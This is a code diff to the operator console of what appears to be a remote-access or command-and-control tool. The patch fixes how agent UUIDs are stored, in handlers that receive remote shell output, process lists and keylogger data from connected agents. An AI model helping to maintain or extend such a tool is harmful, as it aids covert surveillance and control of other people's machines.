@@ -203,7 +203,7 @@ void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
     
     QListWidgetItem* item = nullptr;
     for (int i = 0; i < m_agentList->count(); ++i) {
-        if (m_agentList->item(i)->data(Qt::UserRole).toString() == uuid) {
+        if (m_agentList->item(i)->data(Qt::UserRole).toString() == ip) {
             item = m_agentList->item(i);
             break;
         }
@@ -212,6 +212,7 @@ void MainWindow::onAgentConnected(const QString& ip, const QString& info) {
     if (!item) {
         item = new QListWidgetItem("🟢 " + displayInfo, m_agentList);
         item->setData(Qt::UserRole, ip);
+        item->setData(Qt::UserRole + 1, uuid);
     } else {
         item->setText("🟢 " + displayInfo);
     }
@@ -254,7 +255,7 @@ void MainWindow::onShellOutputReceived(const QString& ip, const QString& output)
     QString uuid = m_agentIpToUuid.value(ip);
     if (uuid.isEmpty()) {
         auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
-        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
+        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole + 1).toString();
     }
 
     for (const QString& line : lines) {
@@ -275,7 +276,7 @@ void MainWindow::onProcessListReceived(const QString& ip, const QString& output)
     QString uuid = m_agentIpToUuid.value(ip);
     if (uuid.isEmpty()) {
         auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
-        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
+        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole + 1).toString();
     }
     
     Inferno_Database::instance().logTelemetry(uuid, "PROC", output);
@@ -292,7 +293,7 @@ void MainWindow::onKeylogReceived(const QString& ip, const QString& data) {
     QString uuid = m_agentIpToUuid.value(ip);
     if (uuid.isEmpty()) {
         auto items = m_agentList->findItems(ip, Qt::MatchStartsWith);
-        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole).toString();
+        if (!items.isEmpty()) uuid = items.first()->data(Qt::UserRole + 1).toString();
     }
 
     Inferno_Database::instance().logKeylog(uuid, data);
